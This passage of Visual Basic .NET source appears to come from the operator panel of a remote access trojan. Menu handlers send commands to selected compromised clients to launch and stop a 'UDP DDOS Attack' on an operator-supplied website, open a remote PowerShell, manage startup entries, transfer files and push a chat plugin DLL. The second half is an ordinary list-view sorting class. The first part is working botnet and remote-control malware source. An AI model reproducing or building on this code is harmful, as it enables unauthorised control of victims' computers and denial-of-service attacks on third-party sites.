    Private Sub StartupManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartupManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("sm"))
        Next
    End Sub
    Private Sub SingleTransferToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SingleTransferToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("opentransfer"))
        Next
    End Sub
    Private Sub MultiTransferToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MultiTransferToolStripMenuItem.Click
        Dim multit As New multit
        multit.Text = "Transfer Target - Multi Users"
        multit.Show()
    End Sub

    Private Sub StartToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem2.Click
        Dim strD As String = Interaction.InputBox("WebSite URL :", "UDP DDOS Attack", "www.google.com")
        If strD = "" Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("UDPStart") & Y & ENB(strD))
            Next
            MsgBox("Attack Started", MsgBoxStyle.Information, "DONE !")
        End If
    End Sub

    Private Sub StopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("UDPStop"))
        Next
    End Sub

    Private Sub RemotePowershellToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemotePowershellToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("pss"))
        Next
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("openchat") & Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugins/chat.dll")))
        Next
    End Sub
End Class
Public Class LV
    Inherits System.Windows.Forms.ListView
    Public Sub New()
        MyBase.New()
        Me.AllowDrop = False
        Me.Font = New Font("arial", 8, FontStyle.Bold)
        Me.Dock = DockStyle.Fill
        Me.FullRowSelect = True
        Me.View = Windows.Forms.View.Details
        Me.SetStyle((ControlStyles.OptimizedDoubleBuffer Or ControlStyles.AllPaintingInWmPaint), True)
        Me.SetStyle(ControlStyles.EnableNotifyMessage, True)
    End Sub
    Public Sub FX()
        Me.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub
    Protected Overrides Sub OnNotifyMessage(ByVal m As Message)
        Exit Sub
        If (m.Msg <> 20) Then
            MyBase.OnNotifyMessage(m)
        End If
    End Sub
#Region "Listview Sort"
    Private m_SortingColumn As ColumnHeader
    Public Sub ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs) Handles MyBase.ColumnClick
        Dim new_sorting_column As ColumnHeader = sender.Columns(e.Column)
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            sort_order = SortOrder.Ascending
        Else
            If new_sorting_column.Equals(m_SortingColumn) Then
                If m_SortingColumn.Text.StartsWith("+") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                sort_order = SortOrder.Ascending
            End If
            m_SortingColumn.Text = m_SortingColumn.Text.Substring(1)
        End If
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "+" & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "-" & m_SortingColumn.Text
        End If
        If sender Is Nothing Then Exit Sub
        sender.ListViewItemSorter = New clsListviewSorter(e.Column, sort_order)
        sender.Sort()
        sender.ListViewItemSorter = Nothing
    End Sub
    Public Class clsListviewSorter
        Implements IComparer
        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder
        Public Sub New(ByVal column_number As Integer, ByVal sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub
        Public Function Compare(ByVal x As Object, ByVal y As Object) As Integer Implements System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x, ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y, ListViewItem)
            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If
            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If
            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class
#End Region
End Class